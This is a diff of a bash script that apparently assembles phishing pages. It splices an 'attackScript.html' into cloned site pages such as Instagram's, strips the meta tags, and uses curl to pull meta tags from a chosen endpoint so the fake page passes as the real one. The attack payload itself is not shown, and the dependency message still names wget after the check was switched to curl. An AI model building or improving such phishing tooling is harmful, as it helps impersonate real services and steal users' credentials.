@@ -2,7 +2,7 @@
 
 dependencies() {
 
-    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+    command -v curl > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
@@ -11,7 +11,7 @@ menu() {
 
     read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Add a end point page: \e[0m\en' endpoint
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Add a end point page (or \"none\"): \e[0m\en' endpoint
 
     if [[ $option == 1 ]]; then
         page="Instagram"
@@ -35,16 +35,36 @@ make() {
 
     attackScript=`cat ./logic/attackScript.html`
     mainScript=`cat ./websites/$page/$page.html`
-    falseEndMeta="penis"
 
     attackScriptId="<script type='attackLogic'></script>"
     falseEndId="<meta type='falseEnd'>"
 
-
     mainScript="${mainScript/$attackScriptId/$attackScript}"
-    mainScript="${mainScript/$falseEndId/$falseEndMeta}"
 
-    echo $mainScript > "./$page.html"
+    if [ "$endpoint" != "none" ]; then
+
+        #start it off
+        meta=`echo $mainScript | grep -o -m 1 "<meta[^<]*>" | head -1`
+
+        #while not at end
+        while [[ $meta != $falseEndId ]]
+        do
+
+            #remove meta
+            mainScript="${mainScript/$meta/}"
+            meta=`echo $mainScript | grep -o -m 1 "<meta[^<]*>" | head -1`
+
+        done
+
+        falseEndMeta=`curl -s $endpoint`
+        falseEndMeta=`echo $falseEndMeta | grep -o "<meta[^<]*>"`
+        
+        mainScript="${mainScript/$falseEndId/$falseEndMeta}"
+
+    fi
+
+    echo $mainScript > "./index.html"
+
 }
 
 
